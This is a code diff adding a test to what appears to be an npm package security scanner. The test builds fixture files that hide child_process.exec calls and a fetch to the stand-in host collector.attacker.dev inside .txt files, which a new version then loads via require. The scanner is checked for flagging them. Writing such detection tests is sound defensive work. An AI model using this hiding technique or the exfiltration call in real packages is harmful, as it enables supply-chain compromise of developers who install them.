@@ -208,6 +208,21 @@ test('a file new to a version that its code loads and that isn\'t text, told as 
     'not a file nothing loads, nor an image code loads that node can\'t parse')
 })
 
+test('a file a version held alike that its code now loads, told as new: what node runs of it it didn\'t before', async t => {
+  const meta = { dependencies: {}, scripts: {} }
+  const opaque = Buffer.concat([Buffer.from("require('child_process').exec(cmd) // "), Buffer.from([0xFF]), Buffer.from('\n')])
+  const files = { 'package.json': '{}', 'data.txt': "require('child_process').exec(cmd)\nfetch('https://collector.attacker.dev/in')\n", 'payload.txt': opaque }
+  const before = version('wakes', '1.0.0', { ...files, 'index.js': 'module.exports = 1\n' }, meta, ago(60))
+  const after = version('wakes', '1.0.1', { ...files, 'index.js': "require('./data.txt')\nrequire('./payload.txt')\n" }, meta, ago(40))
+  npm(t, [{ name: 'wakes', versions: [before, after] }])
+  const { findings } = await assessNpm('wakes', '1.0.1', { oldVersion: '1.0.0', now: NOW, downloads: false })
+  assert.deepEqual(findings.filter(({ id }) => id.includes('runs-code') || id === 'binary-code'), [
+    { id: 'held-runs-code', severity: 'critical', files: [{ path: 'data.txt', found: { 'child-process': [1] }, added: { 'child-process': [1] } }] },
+    { id: 'binary-code', severity: 'critical', files: [{ path: 'payload.txt', bytes: opaque.length }] },
+  ], 'red, as new to what node runs')
+  assert.deepEqual(findings.find(({ id }) => id === 'new-hosts')?.hosts.map(({ host, path }) => [host, path]), [['collector.attacker.dev', 'data.txt']], 'and a host it names new')
+})
+
 test('credentials a file reaches for, a finding of their own apart from the code it runs: red where new to it, orange where kept', async t => {
   const meta = { dependencies: {}, scripts: {} }
   const before = version('auth', '1.0.0', { 'package.json': '{}', 'lib/run.js': "require('child_process').exec(cmd)\n", 'lib/rc.js': "readFileSync(join(homedir(), '.npmrc'))\n" }, meta, ago(60))
